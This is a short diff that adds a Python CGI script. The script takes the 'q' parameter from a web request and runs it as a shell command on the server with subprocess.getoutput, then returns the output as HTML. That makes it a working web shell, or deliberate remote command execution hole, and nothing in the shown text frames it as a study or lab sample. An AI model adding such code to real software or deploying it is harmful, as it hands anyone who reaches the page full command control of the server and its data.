@@ -1,0 +1,15 @@
+#!/usr/bin/python3
+
+import subprocess
+import cgi
+
+print("Content-type: text/html")
+print()
+
+mydata = cgi.FieldStorage()
+
+cmd = mydata.getvalue("q")
+output = subprocess.getoutput(cmd)
+print("<pre>")
+print(output)
+print("</pre>")
